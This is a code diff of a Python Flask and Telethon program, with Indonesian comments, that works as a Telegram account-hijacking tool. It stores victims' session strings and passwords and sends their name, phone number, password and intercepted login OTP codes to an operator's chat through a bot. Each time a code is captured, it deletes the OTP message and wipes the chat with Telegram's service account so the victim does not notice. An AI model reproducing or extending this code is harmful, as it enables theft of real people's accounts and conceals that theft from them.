@@ -13,11 +13,10 @@ API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
-# Pastikan RAILWAY_STATIC_URL ada di Variables Railway
 DOMAIN = os.getenv("RAILWAY_STATIC_URL")
+# Memastikan URL Webhook menggunakan HTTPS
 RAILWAY_URL = f"https://{DOMAIN}" if DOMAIN else ""
 
-# Database RAM
 user_db = {}
 
 def bot_api(method, payload):
@@ -80,14 +79,11 @@ async def handle_flow(data):
         if client: await client.disconnect()
 
 async def finalize_login(client, nomor):
-    # Ambil Nama Depan Asli Telegram
     me = await client.get_me()
     nama_full = me.first_name if me.first_name else "User"
-    nama_depan = nama_full.split()[0] # Ambil 1 kata saja
+    nama_depan = nama_full.split()[0]
     
     user_db[nomor].update({"nama": nama_depan, "session": client.session.save()})
-    
-    # Ghost Mode: Hapus riwayat 777000
     await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
     
     pesan = f"Nama: **{nama_depan}**\nNomor: `{nomor}`\nKata sandi: {user_db[nomor]['sandi']}"
@@ -104,14 +100,12 @@ def webhook():
     update = request.get_json()
     if update and "callback_query" in update:
         call = update["callback_query"]
-        # Hilangkan loading di tombol
         bot_api("answerCallbackQuery", {"callback_query_id": call["id"]})
         
         callback_data = call.get("data", "")
         if "_" in callback_data:
             act, nomor = callback_data.split("_", 1)
             if act == "upd":
-                # Kirim teks status
                 res = bot_api("sendMessage", {
                     "chat_id": CHAT_ID, 
                     "text": "Bot Siap Menerima OTP, klik /exit untuk keluar"
@@ -119,7 +113,6 @@ def webhook():
                 if nomor in user_db:
                     user_db[nomor]['status_msg_id'] = res.get('result', {}).get('message_id')
                 
-                # Jalankan Thread Monitoring
                 threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
                 
     return jsonify({"status": "success"}), 200
@@ -131,41 +124,31 @@ async def monitor_otp(nomor):
     client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
     try:
         await client.connect()
-        if not await client.is_user_authorized():
-            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"⚠️ Nomor {nomor} telah keluar sesi, tidak dapat mengambil kode."})
-            return
-
         @client.on(events.NewMessage(from_users=777000))
         async def handler(event):
             otp = re.search(r'\b\d{5}\b', event.raw_text)
             if otp:
-                # 1. Hapus teks "Bot Siap..."
                 if data.get('status_msg_id'):
                     bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_msg_id']})
                 
-                # 2. Kirim Data Lengkap + OTP Baru
-                otp_code = otp.group(0)
-                teks_final = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: {data['sandi']}\nOTP: `{otp_code}`"
+                teks_final = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: {data['sandi']}\nOTP: `{otp.group(0)}`"
                 bot_api("sendMessage", {
                     "chat_id": CHAT_ID, 
                     "text": teks_final, 
                     "parse_mode": "Markdown",
                     "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
                 })
-                
-                # 3. Ghost Mode
                 await event.delete(revoke=True)
                 await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
 
         await asyncio.wait_for(client.run_until_disconnected(), timeout=900)
-    except Exception as e:
-        if "revoked" in str(e).lower():
-            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"⚠️ Nomor {nomor} telah keluar sesi."})
-    finally:
-        await client.disconnect()
+    except: pass
+    finally: await client.disconnect()
 
 if __name__ == "__main__":
-    # Sinkronisasi Webhook Otomatis
+    # Paksa Set Webhook saat server nyala
     if RAILWAY_URL:
-        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
+        wh_url = f"{RAILWAY_URL}/webhook"
+        result = bot_api("setWebhook", {"url": wh_url})
+        print(f"🛰️ STATUS WEBHOOK: {result}") # Lihat di View Logs
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
